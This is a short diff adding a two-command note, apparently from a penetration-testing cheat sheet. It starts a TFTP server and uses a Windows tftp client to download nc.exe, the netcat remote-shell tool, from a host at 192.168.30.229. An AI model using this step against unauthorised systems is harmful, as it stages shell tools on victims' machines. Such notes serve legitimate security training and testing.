@@ -1,0 +1,5 @@
+# Start the tftp service
+atftpd --daemon --port 69 /tmp/tftp
+
+# Get a remote file
+tftp -i 192.168.30.229 get nc.exe
